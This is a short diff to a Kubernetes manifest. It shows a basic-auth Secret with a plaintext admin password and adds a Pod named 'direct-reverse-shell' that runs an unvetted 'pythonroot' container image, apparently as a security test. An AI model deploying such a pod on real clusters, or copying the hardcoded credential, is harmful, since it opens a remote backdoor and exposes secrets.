@@ -19,3 +19,13 @@ type: kubernetes.io/basic-auth
 stringData:
   username: admin
   password: t0p-Secret
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: direct-reverse-shell
+  namespace: default
+spec:
+  containers:
+  - name: pythonroot-testing2
+    image: docker.io/rednoob/pythonroot:latest
